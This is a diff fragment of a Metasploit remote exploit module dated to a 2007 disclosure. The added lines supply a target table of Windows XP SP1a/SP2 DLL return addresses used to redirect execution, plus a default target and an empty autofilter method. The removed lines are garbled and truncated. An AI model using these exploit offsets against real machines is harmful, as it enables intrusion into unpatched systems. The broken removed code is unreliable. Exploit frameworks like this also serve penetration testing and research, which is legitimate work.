@@ -106,7 +106,18 @@ class MetasploitModule < Msf::Exploit::Remote
           #
 
           # call [ebx+4]
-          [ 'Windows XP SP2 user { 'Ret' => 0x, 
-          [ 'Windows XP SP2 user { 'Ret' => 0x, 
-          [ 'Windows XP SP2 user { 'Ret' => 0x, 
-  
+          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language', { 'Ret' => 0x25d0, 'Len' => 2 }],
+          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) English', { 'Ret' => 0x77d825d0 }],
+          [ 'Windows XP SP2 userenv.dll Portuguese (Brazil)', { 'Ret' => 0x769dc81a }],
+
+          # call [esi+4]
+          [ 'Windows XP SP1a userenv.dll English', { 'Ret' => 0x75a758b1 }],
+          [ 'Windows XP SP1a shell32.dll English', { 'Ret' => 0x77441a66 }]
+        ],
+      'DisclosureDate'  => 'Mar 28 2007',
+      'DefaultTarget' => 0))
+  end
+
+  def autofilter
+
+  end
